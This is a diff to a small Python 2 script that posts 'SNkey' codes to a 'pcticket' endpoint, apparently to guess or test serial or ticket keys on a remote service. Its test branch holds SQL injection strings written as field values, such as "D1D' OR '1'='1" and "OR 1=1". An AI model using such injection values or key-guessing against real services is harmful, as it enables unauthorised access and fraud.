@@ -56,7 +56,7 @@ def try_code(num):
     return '00'
   content = response.read()
   bs_page =  BeautifulSoup(gzdecode(content))
-  # print bs_page
+  print bs_page
   opener.close()
   return bs_page.find('p').contents[0][11]+bs_page.find('p').contents[0][24]
 
@@ -64,18 +64,20 @@ def code_write(fp, num):
   fp.writelines(num)
   fp.writelines('\n')
 
-# _test = True
-_test = False
+_test = True
+# _test = False
 def main():
   _file = open(_file_name, 'a')
   if _test:
-    code = "D1D' OR '1'='1"
+    code = "D1DGEDF3FSGH OR 1=1"
+    code = "111111111111"
     data = {'action':'pcticket',
             'SNkey':code}
     # data = urllib.urlencode(data)
     data = 'action=pcticket&SNkey='+code
     print data
-    try_code(data)
+    d = try_code(data)
+    print d
     return
   while True:
     code = ''
